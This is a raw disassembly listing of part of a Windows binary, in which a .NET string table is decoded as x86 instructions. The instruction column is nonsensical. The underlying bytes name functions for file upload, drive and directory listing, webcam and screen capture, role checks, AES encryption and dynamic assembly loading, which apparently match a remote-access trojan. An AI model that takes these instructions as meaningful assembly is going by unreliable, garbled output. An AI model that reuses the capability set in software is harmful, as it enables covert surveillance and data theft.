  409783:	61                   	popa
  409784:	67 65 42             	addr16 gs inc %edx
  409787:	6f                   	outsl  %ds:(%esi),(%dx)
  409788:	78 00                	js     0x40978a
  40978a:	44                   	inc    %esp
  40978b:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  409792:	73 75                	jae    0x409809
  409794:	6c                   	insb   (%dx),%es:(%edi)
  409795:	74 00                	je     0x409797
  409797:	53                   	push   %ebx
  409798:	68 6f 77 00 55       	push   $0x5500776f
  40979d:	70 6c                	jo     0x40980b
  40979f:	6f                   	outsl  %ds:(%esi),(%dx)
  4097a0:	61                   	popa
  4097a1:	64 46                	fs inc %esi
  4097a3:	69 6c 65 00 45 6e 76 	imul   $0x69766e45,0x0(%ebp,%eiz,2),%ebp
  4097aa:	69 
  4097ab:	72 6f                	jb     0x40981c
  4097ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ae:	00 53 65             	add    %dl,0x65(%ebx)
  4097b1:	74 56                	je     0x409809
  4097b3:	61                   	popa
  4097b4:	6c                   	insb   (%dx),%es:(%edi)
  4097b5:	75 65                	jne    0x40981c
  4097b7:	00 53 70             	add    %dl,0x70(%ebx)
  4097ba:	61                   	popa
  4097bb:	63 65 00             	arpl   %esp,0x0(%ebp)
  4097be:	44                   	inc    %esp
  4097bf:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4097c6:	79 49                	jns    0x409811
  4097c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097c9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097cb:	00 47 65             	add    %al,0x65(%edi)
  4097ce:	74 44                	je     0x409814
  4097d0:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4097d7:	69 65 73 00 67 65 74 	imul   $0x74656700,0x73(%ebp),%esp
  4097de:	5f                   	pop    %edi
  4097df:	4e                   	dec    %esi
  4097e0:	61                   	popa
  4097e1:	6d                   	insl   (%dx),%es:(%edi)
  4097e2:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4097e6:	74 46                	je     0x40982e
  4097e8:	69 6c 65 73 00 49 6e 	imul   $0x746e4900,0x73(%ebp,%eiz,2),%ebp
  4097ef:	74 
  4097f0:	36 34 00             	ss xor $0x0,%al
  4097f3:	44                   	inc    %esp
  4097f4:	72 69                	jb     0x40985f
  4097f6:	76 65                	jbe    0x40985d
  4097f8:	49                   	dec    %ecx
  4097f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4097fa:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097fc:	00 53 79             	add    %dl,0x79(%ebx)
  4097ff:	73 74                	jae    0x409875
  409801:	65 6d                	gs insl (%dx),%es:(%edi)
  409803:	2e 43                	cs inc %ebx
  409805:	6f                   	outsl  %ds:(%esi),(%dx)
  409806:	6c                   	insb   (%dx),%es:(%edi)
  409807:	6c                   	insb   (%dx),%es:(%edi)
  409808:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40980d:	6e                   	outsb  %ds:(%esi),(%dx)
  40980e:	73 2e                	jae    0x40983e
  409810:	47                   	inc    %edi
  409811:	65 6e                	outsb  %gs:(%esi),(%dx)
  409813:	65 72 69             	gs jb  0x40987f
  409816:	63 00                	arpl   %eax,(%eax)
  409818:	49                   	dec    %ecx
  409819:	45                   	inc    %ebp
  40981a:	6e                   	outsb  %ds:(%esi),(%dx)
  40981b:	75 6d                	jne    0x40988a
  40981d:	65 72 61             	gs jb  0x409881
  409820:	74 6f                	je     0x409891
  409822:	72 60                	jb     0x409884
  409824:	31 00                	xor    %eax,(%eax)
  409826:	44                   	inc    %esp
  409827:	72 69                	jb     0x409892
  409829:	76 65                	jbe    0x409890
  40982b:	54                   	push   %esp
  40982c:	79 70                	jns    0x40989e
  40982e:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  409832:	73 74                	jae    0x4098a8
  409834:	65 6d                	gs insl (%dx),%es:(%edi)
  409836:	2e 43                	cs inc %ebx
  409838:	6f                   	outsl  %ds:(%esi),(%dx)
  409839:	6c                   	insb   (%dx),%es:(%edi)
  40983a:	6c                   	insb   (%dx),%es:(%edi)
  40983b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409840:	6e                   	outsb  %ds:(%esi),(%dx)
  409841:	73 2e                	jae    0x409871
  409843:	4f                   	dec    %edi
  409844:	62 6a 65             	bound  %ebp,0x65(%edx)
  409847:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  40984b:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40984e:	00 52 65             	add    %dl,0x65(%edx)
  409851:	61                   	popa
  409852:	64 4f                	fs dec %edi
  409854:	6e                   	outsb  %ds:(%esi),(%dx)
  409855:	6c                   	insb   (%dx),%es:(%edi)
  409856:	79 43                	jns    0x40989b
  409858:	6f                   	outsl  %ds:(%esi),(%dx)
  409859:	6c                   	insb   (%dx),%es:(%edi)
  40985a:	6c                   	insb   (%dx),%es:(%edi)
  40985b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409860:	6e                   	outsb  %ds:(%esi),(%dx)
  409861:	60                   	pusha
  409862:	31 00                	xor    %eax,(%eax)
  409864:	67 65 74 5f          	addr16 gs je 0x4098c7
  409868:	44                   	inc    %esp
  409869:	72 69                	jb     0x4098d4
  40986b:	76 65                	jbe    0x4098d2
  40986d:	73 00                	jae    0x40986f
  40986f:	67 65 74 5f          	addr16 gs je 0x4098d2
  409873:	44                   	inc    %esp
  409874:	72 69                	jb     0x4098df
  409876:	76 65                	jbe    0x4098dd
  409878:	54                   	push   %esp
  409879:	79 70                	jns    0x4098eb
  40987b:	65 00 44 6c 6c       	add    %al,%gs:0x6c(%esp,%ebp,2)
  409880:	49                   	dec    %ecx
  409881:	6d                   	insl   (%dx),%es:(%edi)
  409882:	70 6f                	jo     0x4098f3
  409884:	72 74                	jb     0x4098fa
  409886:	41                   	inc    %ecx
  409887:	74 74                	je     0x4098fd
  409889:	72 69                	jb     0x4098f4
  40988b:	62 75 74             	bound  %esi,0x74(%ebp)
  40988e:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  409892:	65 72 33             	gs jb  0x4098c8
  409895:	32 2e                	xor    (%esi),%ch
  409897:	64 6c                	fs insb (%dx),%es:(%edi)
  409899:	6c                   	insb   (%dx),%es:(%edi)
  40989a:	00 61 76             	add    %ah,0x76(%ecx)
  40989d:	69 63 61 70 33 32 2e 	imul   $0x2e323370,0x61(%ebx),%esp
  4098a4:	64 6c                	fs insb (%dx),%es:(%edi)
  4098a6:	6c                   	insb   (%dx),%es:(%edi)
  4098a7:	00 41 63             	add    %al,0x63(%ecx)
  4098aa:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098ad:	73 65                	jae    0x409914
  4098af:	64 54                	fs push %esp
  4098b1:	68 72 6f 75 67       	push   $0x67756f72
  4098b6:	68 50 72 6f 70       	push   $0x706f7250
  4098bb:	65 72 74             	gs jb  0x409932
  4098be:	79 41                	jns    0x409901
  4098c0:	74 74                	je     0x409936
  4098c2:	72 69                	jb     0x40992d
  4098c4:	62 75 74             	bound  %esi,0x74(%ebp)
  4098c7:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4098cb:	72 73                	jb     0x409940
  4098cd:	68 61 6c 41 73       	push   $0x73416c61
  4098d2:	41                   	inc    %ecx
  4098d3:	74 74                	je     0x409949
  4098d5:	72 69                	jb     0x409940
  4098d7:	62 75 74             	bound  %esi,0x74(%ebp)
  4098da:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  4098de:	6d                   	insl   (%dx),%es:(%edi)
  4098df:	61                   	popa
  4098e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4098e1:	61                   	popa
  4098e2:	67 65 64 54          	addr16 gs fs push %esp
  4098e6:	79 70                	jns    0x409958
  4098e8:	65 00 5f 4c          	add    %bl,%gs:0x4c(%edi)
  4098ec:	61                   	popa
  4098ed:	6d                   	insl   (%dx),%es:(%edi)
  4098ee:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4098f2:	5f                   	pop    %edi
  4098f3:	5f                   	pop    %edi
  4098f4:	37                   	aaa
  4098f5:	00 53 79             	add    %dl,0x79(%ebx)
  4098f8:	73 74                	jae    0x40996e
  4098fa:	65 6d                	gs insl (%dx),%es:(%edi)
  4098fc:	2e 54                	cs push %esp
  4098fe:	65 78 74             	gs js  0x409975
  409901:	00 45 6e             	add    %al,0x6e(%ebp)
  409904:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409907:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40990e:	5f                   	pop    %edi
  40990f:	44                   	inc    %esp
  409910:	65 66 61             	gs popaw
  409913:	75 6c                	jne    0x409981
  409915:	74 00                	je     0x409917
  409917:	47                   	inc    %edi
  409918:	65 74 42             	gs je  0x40995d
  40991b:	79 74                	jns    0x409991
  40991d:	65 73 00             	gs jae 0x409920
  409920:	47                   	inc    %edi
  409921:	65 74 53             	gs je  0x409977
  409924:	74 72                	je     0x409998
  409926:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40992d:	5f                   	pop    %edi
  40992e:	50                   	push   %eax
  40992f:	72 6f                	jb     0x4099a0
  409931:	63 65 73             	arpl   %esp,0x73(%ebp)
  409934:	73 6f                	jae    0x4099a5
  409936:	72 43                	jb     0x40997b
  409938:	6f                   	outsl  %ds:(%esi),(%dx)
  409939:	75 6e                	jne    0x4099a9
  40993b:	74 00                	je     0x40993d
  40993d:	67 65 74 5f          	addr16 gs je 0x4099a0
  409941:	4d                   	dec    %ebp
  409942:	61                   	popa
  409943:	63 68 69             	arpl   %ebp,0x69(%eax)
  409946:	6e                   	outsb  %ds:(%esi),(%dx)
  409947:	65 4e                	gs dec %esi
  409949:	61                   	popa
  40994a:	6d                   	insl   (%dx),%es:(%edi)
  40994b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40994f:	74 5f                	je     0x4099b0
  409951:	53                   	push   %ebx
  409952:	79 73                	jns    0x4099c7
  409954:	74 65                	je     0x4099bb
  409956:	6d                   	insl   (%dx),%es:(%edi)
  409957:	44                   	inc    %esp
  409958:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40995f:	79 00                	jns    0x409961
  409961:	47                   	inc    %edi
  409962:	65 74 50             	gs je  0x4099b5
  409965:	61                   	popa
  409966:	74 68                	je     0x4099d0
  409968:	52                   	push   %edx
  409969:	6f                   	outsl  %ds:(%esi),(%dx)
  40996a:	6f                   	outsl  %ds:(%esi),(%dx)
  40996b:	74 00                	je     0x40996d
  40996d:	67 65 74 5f          	addr16 gs je 0x4099d0
  409971:	54                   	push   %esp
  409972:	6f                   	outsl  %ds:(%esi),(%dx)
  409973:	74 61                	je     0x4099d6
  409975:	6c                   	insb   (%dx),%es:(%edi)
  409976:	53                   	push   %ebx
  409977:	69 7a 65 00 53 79 73 	imul   $0x73795300,0x65(%edx),%edi
  40997e:	74 65                	je     0x4099e5
  409980:	6d                   	insl   (%dx),%es:(%edi)
  409981:	2e 53                	cs push %ebx
  409983:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409987:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40998e:	70 
  40998f:	74 6f                	je     0x409a00
  409991:	67 72 61             	addr16 jb 0x4099f5
  409994:	70 68                	jo     0x4099fe
  409996:	79 00                	jns    0x409998
  409998:	4d                   	dec    %ebp
  409999:	44                   	inc    %esp
  40999a:	35 43 72 79 70       	xor    $0x70797243,%eax
  40999f:	74 6f                	je     0x409a10
  4099a1:	53                   	push   %ebx
  4099a2:	65 72 76             	gs jb  0x409a1b
  4099a5:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4099ac:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4099b3:	72 
  4099b4:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4099bb:	64 65 72 00          	fs gs jb 0x4099bf
  4099bf:	67 65 74 5f          	addr16 gs je 0x409a22
  4099c3:	41                   	inc    %ecx
  4099c4:	53                   	push   %ebx
  4099c5:	43                   	inc    %ebx
  4099c6:	49                   	dec    %ecx
  4099c7:	49                   	dec    %ecx
  4099c8:	00 48 61             	add    %cl,0x61(%eax)
  4099cb:	73 68                	jae    0x409a35
  4099cd:	41                   	inc    %ecx
  4099ce:	6c                   	insb   (%dx),%es:(%edi)
  4099cf:	67 6f                	outsl  %ds:(%si),(%dx)
  4099d1:	72 69                	jb     0x409a3c
  4099d3:	74 68                	je     0x409a3d
  4099d5:	6d                   	insl   (%dx),%es:(%edi)
  4099d6:	00 43 6f             	add    %al,0x6f(%ebx)
  4099d9:	6d                   	insl   (%dx),%es:(%edi)
  4099da:	70 75                	jo     0x409a51
  4099dc:	74 65                	je     0x409a43
  4099de:	48                   	dec    %eax
  4099df:	61                   	popa
  4099e0:	73 68                	jae    0x409a4a
  4099e2:	00 41 70             	add    %al,0x70(%ecx)
  4099e5:	70 65                	jo     0x409a4c
  4099e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e8:	64 00 53 75          	add    %dl,%fs:0x75(%ebx)
  4099ec:	62 73 74             	bound  %esi,0x74(%ebx)
  4099ef:	72 69                	jb     0x409a5a
  4099f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f2:	67 00 54 6f          	add    %dl,0x6f(%si)
  4099f6:	55                   	push   %ebp
  4099f7:	70 70                	jo     0x409a69
  4099f9:	65 72 00             	gs jb  0x4099fc
  4099fc:	46                   	inc    %esi
  4099fd:	72 6f                	jb     0x409a6e
  4099ff:	6d                   	insl   (%dx),%es:(%edi)
  409a00:	42                   	inc    %edx
  409a01:	61                   	popa
  409a02:	73 65                	jae    0x409a69
  409a04:	36 34 53             	ss xor $0x53,%al
  409a07:	74 72                	je     0x409a7b
  409a09:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  409a10:	74 65                	je     0x409a77
  409a12:	6d                   	insl   (%dx),%es:(%edi)
  409a13:	2e 52                	cs push %edx
  409a15:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409a18:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a1d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1e:	00 4d 6f             	add    %cl,0x6f(%ebp)
  409a21:	64 75 6c             	fs jne 0x409a90
  409a24:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409a28:	73 65                	jae    0x409a8f
  409a2a:	6d                   	insl   (%dx),%es:(%edi)
  409a2b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409a2f:	4c                   	dec    %esp
  409a30:	6f                   	outsl  %ds:(%esi),(%dx)
  409a31:	61                   	popa
  409a32:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409a36:	74 4d                	je     0x409a85
  409a38:	6f                   	outsl  %ds:(%esi),(%dx)
  409a39:	64 75 6c             	fs jne 0x409aa8
  409a3c:	65 73 00             	gs jae 0x409a3f
  409a3f:	47                   	inc    %edi
  409a40:	65 74 54             	gs je  0x409a97
  409a43:	79 70                	jns    0x409ab5
  409a45:	65 73 00             	gs jae 0x409a48
  409a48:	67 65 74 5f          	addr16 gs je 0x409aab
  409a4c:	46                   	inc    %esi
  409a4d:	75 6c                	jne    0x409abb
  409a4f:	6c                   	insb   (%dx),%es:(%edi)
  409a50:	4e                   	dec    %esi
  409a51:	61                   	popa
  409a52:	6d                   	insl   (%dx),%es:(%edi)
  409a53:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  409a57:	64 73 57             	fs jae 0x409ab1
  409a5a:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  409a61:	5f 
  409a62:	41                   	inc    %ecx
  409a63:	73 73                	jae    0x409ad8
  409a65:	65 6d                	gs insl (%dx),%es:(%edi)
  409a67:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409a6b:	52                   	push   %edx
  409a6c:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  409a73:	4d                   	dec    %ebp
  409a74:	61                   	popa
  409a75:	6e                   	outsb  %ds:(%esi),(%dx)
  409a76:	61                   	popa
  409a77:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%bx,%di)
  409a7d:	72 79                	jb     0x409af8
  409a7f:	70 74                	jo     0x409af5
  409a81:	6f                   	outsl  %ds:(%esi),(%dx)
  409a82:	54                   	push   %esp
  409a83:	72 61                	jb     0x409ae6
  409a85:	6e                   	outsb  %ds:(%esi),(%dx)
  409a86:	73 66                	jae    0x409aee
  409a88:	6f                   	outsl  %ds:(%esi),(%dx)
  409a89:	72 6d                	jb     0x409af8
  409a8b:	00 53 79             	add    %dl,0x79(%ebx)
  409a8e:	6d                   	insl   (%dx),%es:(%edi)
  409a8f:	6d                   	insl   (%dx),%es:(%edi)
  409a90:	65 74 72             	gs je  0x409b05
  409a93:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409a9a:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  409aa1:	74 
  409aa2:	5f                   	pop    %edi
  409aa3:	4b                   	dec    %ebx
  409aa4:	65 79 00             	gs jns 0x409aa7
  409aa7:	43                   	inc    %ebx
  409aa8:	69 70 68 65 72 4d 6f 	imul   $0x6f4d7265,0x68(%eax),%esi
  409aaf:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  409ab4:	74 5f                	je     0x409b15
  409ab6:	4d                   	dec    %ebp
  409ab7:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab8:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  409abd:	65 61                	gs popa
  409abf:	74 65                	je     0x409b26
  409ac1:	45                   	inc    %ebp
  409ac2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac3:	63 72 79             	arpl   %esi,0x79(%edx)
  409ac6:	70 74                	jo     0x409b3c
  409ac8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ac9:	72 00                	jb     0x409acb
  409acb:	54                   	push   %esp
  409acc:	72 61                	jb     0x409b2f
  409ace:	6e                   	outsb  %ds:(%esi),(%dx)
  409acf:	73 66                	jae    0x409b37
  409ad1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad2:	72 6d                	jb     0x409b41
  409ad4:	46                   	inc    %esi
  409ad5:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  409adc:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409adf:	43                   	inc    %ebx
  409ae0:	72 65                	jb     0x409b47
  409ae2:	61                   	popa
  409ae3:	74 65                	je     0x409b4a
  409ae5:	44                   	inc    %esp
  409ae6:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409aea:	70 74                	jo     0x409b60
  409aec:	6f                   	outsl  %ds:(%esi),(%dx)
  409aed:	72 00                	jb     0x409aef
  409aef:	67 65 74 5f          	addr16 gs je 0x409b52
  409af3:	4c                   	dec    %esp
  409af4:	61                   	popa
  409af5:	73 74                	jae    0x409b6b
  409af7:	57                   	push   %edi
  409af8:	72 69                	jb     0x409b63
  409afa:	74 65                	je     0x409b61
  409afc:	54                   	push   %esp
  409afd:	69 6d 65 00 53 79 73 	imul   $0x73795300,0x65(%ebp),%ebp
  409b04:	74 65                	je     0x409b6b
  409b06:	6d                   	insl   (%dx),%es:(%edi)
  409b07:	2e 53                	cs push %ebx
  409b09:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409b0d:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  409b14:	6e 
  409b15:	63 69 70             	arpl   %ebp,0x70(%ecx)
  409b18:	61                   	popa
  409b19:	6c                   	insb   (%dx),%es:(%edi)
  409b1a:	00 57 69             	add    %dl,0x69(%edi)
  409b1d:	6e                   	outsb  %ds:(%esi),(%dx)
  409b1e:	64 6f                	outsl  %fs:(%esi),(%dx)
  409b20:	77 73                	ja     0x409b95
  409b22:	49                   	dec    %ecx
  409b23:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409b26:	74 69                	je     0x409b91
  409b28:	74 79                	je     0x409ba3
  409b2a:	00 47 65             	add    %al,0x65(%edi)
  409b2d:	74 43                	je     0x409b72
  409b2f:	75 72                	jne    0x409ba3
  409b31:	72 65                	jb     0x409b98
  409b33:	6e                   	outsb  %ds:(%esi),(%dx)
  409b34:	74 00                	je     0x409b36
  409b36:	57                   	push   %edi
  409b37:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  409b3e:	72 69                	jb     0x409ba9
  409b40:	6e                   	outsb  %ds:(%esi),(%dx)
  409b41:	63 69 70             	arpl   %ebp,0x70(%ecx)
  409b44:	61                   	popa
  409b45:	6c                   	insb   (%dx),%es:(%edi)
  409b46:	00 57 69             	add    %dl,0x69(%edi)
  409b49:	6e                   	outsb  %ds:(%esi),(%dx)
  409b4a:	64 6f                	outsl  %fs:(%esi),(%dx)
  409b4c:	77 73                	ja     0x409bc1
  409b4e:	42                   	inc    %edx
  409b4f:	75 69                	jne    0x409bba
  409b51:	6c                   	insb   (%dx),%es:(%edi)
  409b52:	74 49                	je     0x409b9d
  409b54:	6e                   	outsb  %ds:(%esi),(%dx)
  409b55:	52                   	push   %edx
  409b56:	6f                   	outsl  %ds:(%esi),(%dx)
  409b57:	6c                   	insb   (%dx),%es:(%edi)
  409b58:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  409b5c:	49                   	dec    %ecx
  409b5d:	6e                   	outsb  %ds:(%esi),(%dx)
  409b5e:	52                   	push   %edx
  409b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b60:	6c                   	insb   (%dx),%es:(%edi)
  409b61:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  409b65:	73 74                	jae    0x409bdb
  409b67:	65 6d                	gs insl (%dx),%es:(%edi)
  409b69:	2e 4d                	cs dec %ebp
  409b6b:	61                   	popa
  409b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  409b6d:	61                   	popa
  409b6e:	67 65 6d             	gs insl (%dx),%es:(%di)
  409b71:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b73:	74 00                	je     0x409b75
  409b75:	4d                   	dec    %ebp
  409b76:	61                   	popa
  409b77:	6e                   	outsb  %ds:(%esi),(%dx)
  409b78:	61                   	popa
  409b79:	67 65 6d             	gs insl (%dx),%es:(%di)
  409b7c:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b7e:	74 4f                	je     0x409bcf
  409b80:	62 6a 65             	bound  %ebp,0x65(%edx)
  409b83:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409b87:	61                   	popa
  409b88:	72 63                	jb     0x409bed
  409b8a:	68 65 72 00 4d       	push   $0x4d007265
  409b8f:	61                   	popa
  409b90:	6e                   	outsb  %ds:(%esi),(%dx)
  409b91:	61                   	popa
  409b92:	67 65 6d             	gs insl (%dx),%es:(%di)
  409b95:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b97:	74 42                	je     0x409bdb
  409b99:	61                   	popa
  409b9a:	73 65                	jae    0x409c01
  409b9c:	4f                   	dec    %edi
  409b9d:	62 6a 65             	bound  %ebp,0x65(%edx)
  409ba0:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409ba4:	61                   	popa
  409ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba6:	61                   	popa
  409ba7:	67 65 6d             	gs insl (%dx),%es:(%di)
  409baa:	65 6e                	outsb  %gs:(%esi),(%dx)
  409bac:	74 4f                	je     0x409bfd
  409bae:	62 6a 65             	bound  %ebp,0x65(%edx)
  409bb1:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409bb5:	6c                   	insb   (%dx),%es:(%edi)
  409bb6:	6c                   	insb   (%dx),%es:(%edi)
  409bb7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  409bbd:	00 4d 61             	add    %cl,0x61(%ebp)
  409bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  409bc1:	61                   	popa
  409bc2:	67 65 6d             	gs insl (%dx),%es:(%di)
  409bc5:	65 6e                	outsb  %gs:(%esi),(%dx)
  409bc7:	74 4f                	je     0x409c18
  409bc9:	62 6a 65             	bound  %ebp,0x65(%edx)
  409bcc:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  409bd0:	75 6d                	jne    0x409c3f
  409bd2:	65 72 61             	gs jb  0x409c36
  409bd5:	74 6f                	je     0x409c46
  409bd7:	72 00                	jb     0x409bd9
  409bd9:	47                   	inc    %edi
  409bda:	65 74 00             	gs je  0x409bdd
  409bdd:	67 65 74 5f          	addr16 gs je 0x409c40
  409be1:	49                   	dec    %ecx
  409be2:	74 65                	je     0x409c49
  409be4:	6d                   	insl   (%dx),%es:(%edi)
  409be5:	00 55 72             	add    %dl,0x72(%ebp)
  409be8:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  409bee:	44                   	inc    %esp
  409bef:	6e                   	outsb  %ds:(%esi),(%dx)
  409bf0:	73 53                	jae    0x409c45
  409bf2:	61                   	popa
  409bf3:	66 65 48             	gs dec %ax
  409bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  409bf7:	73 74                	jae    0x409c6d
  409bf9:	00 67 65             	add    %ah,0x65(%edi)
  409bfc:	74 5f                	je     0x409c5d
  409bfe:	55                   	push   %ebp
  409bff:	54                   	push   %esp
  409c00:	46                   	inc    %esi
  409c01:	38 00                	cmp    %al,(%eax)
  409c03:	45                   	inc    %ebp
  409c04:	6e                   	outsb  %ds:(%esi),(%dx)
  409c05:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409c08:	65 72 50             	gs jb  0x409c5b
  409c0b:	61                   	popa
  409c0c:	72 61                	jb     0x409c6f
  409c0e:	6d                   	insl   (%dx),%es:(%edi)
  409c0f:	65 74 65             	gs je  0x409c77
  409c12:	72 00                	jb     0x409c14
  409c14:	45                   	inc    %ebp
  409c15:	6e                   	outsb  %ds:(%esi),(%dx)
  409c16:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409c19:	65 72 50             	gs jb  0x409c6c
  409c1c:	61                   	popa
  409c1d:	72 61                	jb     0x409c80
  409c1f:	6d                   	insl   (%dx),%es:(%edi)
  409c20:	65 74 65             	gs je  0x409c88
  409c23:	72 73                	jb     0x409c98
  409c25:	00 47 72             	add    %al,0x72(%edi)
  409c28:	61                   	popa
  409c29:	70 68                	jo     0x409c93
  409c2b:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  409c32:	5f                   	pop    %edi
  409c33:	57                   	push   %edi
  409c34:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  409c3b:	74 
  409c3c:	5f                   	pop    %edi
  409c3d:	48                   	dec    %eax
  409c3e:	65 69 67 68 74 00 46 	imul   $0x72460074,%gs:0x68(%edi),%esp
  409c45:	72 
  409c46:	6f                   	outsl  %ds:(%esi),(%dx)
  409c47:	6d                   	insl   (%dx),%es:(%edi)
  409c48:	49                   	dec    %ecx
  409c49:	6d                   	insl   (%dx),%es:(%edi)
  409c4a:	61                   	popa
  409c4b:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  409c50:	6f                   	outsl  %ds:(%esi),(%dx)
  409c51:	6d                   	insl   (%dx),%es:(%edi)
  409c52:	48                   	dec    %eax
  409c53:	77 6e                	ja     0x409cc3
  409c55:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409c59:	74 48                	je     0x409ca3
  409c5b:	64 63 00             	arpl   %eax,%fs:(%eax)
  409c5e:	52                   	push   %edx
  409c5f:	65 6c                	gs insb (%dx),%es:(%edi)
  409c61:	65 61                	gs popa
  409c63:	73 65                	jae    0x409cca
  409c65:	48                   	dec    %eax
  409c66:	64 63 00             	arpl   %eax,%fs:(%eax)
  409c69:	43                   	inc    %ebx
  409c6a:	75 72                	jne    0x409cde
  409c6c:	73 6f                	jae    0x409cdd
  409c6e:	72 73                	jb     0x409ce3
  409c70:	00 67 65             	add    %ah,0x65(%edi)
  409c73:	74 5f                	je     0x409cd4
  409c75:	50                   	push   %eax
  409c76:	6f                   	outsl  %ds:(%esi),(%dx)
  409c77:	73 69                	jae    0x409ce2
  409c79:	74 69                	je     0x409ce4
  409c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c7c:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7d:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
  409c81:	77 00                	ja     0x409c83
  409c83:	6f                   	outsl  %ds:(%esi),(%dx)
  409c84:	70 5f                	jo     0x409ce5
  409c86:	49                   	dec    %ecx
  409c87:	6e                   	outsb  %ds:(%esi),(%dx)
  409c88:	65 71 75             	gs jno 0x409d00
  409c8b:	61                   	popa
  409c8c:	6c                   	insb   (%dx),%es:(%edi)
  409c8d:	69 74 79 00 45 6e 63 	imul   $0x6f636e45,0x0(%ecx,%edi,2),%esi
  409c94:	6f 
  409c95:	64 65 72 00          	fs gs jb 0x409c99
  409c99:	51                   	push   %ecx
  409c9a:	75 61                	jne    0x409cfd
  409c9c:	6c                   	insb   (%dx),%es:(%edi)
